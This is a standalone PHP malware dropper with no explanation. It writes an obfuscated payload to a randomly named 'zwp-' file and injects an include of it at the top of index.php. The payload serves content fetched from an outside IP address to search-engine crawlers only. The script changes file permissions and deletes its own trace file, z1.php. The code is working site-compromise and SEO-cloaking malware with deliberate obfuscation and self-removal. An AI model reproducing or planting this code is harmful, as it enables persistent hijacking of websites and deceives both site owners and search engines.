<?php


$code = '<?php goto y77fj; y77fj: $botbotbot = "\x2e\x2e\x2e" . mb_strtolower($_SERVER[HTTP_USER_AGENT]); goto Ik6OS; ixzQX: if (strpos($botbotbot, "\147\157\157\x67\154\145") or strpos($botbotbot, "\x62\151\x6e\147") or strpos($botbotbot, "\x79\141\x68\157\x6f")) { $ch = curl_init(); $xxx = sqrt(30976); curl_setopt($ch, CURLOPT_URL, "\150\x74\164\160\72\x2f\x2f{$xxx}\x2e\x33\x31\56\62\x35\63\56\x32\x32\67\57\x63\141\x6b\145\x73\57\x3f\165\163\145\162\x61\147\x65\156\164\x3d{$botbotbot}\46\144\x6f\x6d\x61\151\156\x3d{$_SERVER["\x48\x54\x54\120\x5f\110\x4f\x53\124"]}"); $result = curl_exec($ch); curl_close($ch); echo $result; } goto Nu4NO; Ik6OS: $botbotbot = str_replace("\x20", "\55", $botbotbot); goto ixzQX; Nu4NO: ?>
';

$let = array ("q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m","q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m");    

$mynamee='zwp-';     
for ($ns=1;$ns<rand(6,6);$ns++)     
{     
$r = rand (0,count($let)-1);     
$mynamee .= $let[$r];     
} 

if (file_exists("index.php"))
{
	 $file = fopen("index.php", "r");
$buffer = fread($file, filesize("index.php")); 
$buffer2 = str_replace("\n", "11111111111111", $buffer);
if (strpos($buffer2, 'zwp-')<5) 
{
chmod ("index.php", 0777);
$out = fopen("$mynamee", "w");
fwrite($out, $code);
fclose($out);

$file = fopen("index.php", "r");  


    $file_data = "<?php include(\"".$mynamee."\");?>\n".$buffer;
    file_put_contents('index.php', $file_data);
chmod ("index.php", 0644);
}
}
@unlink("z1.php");

?>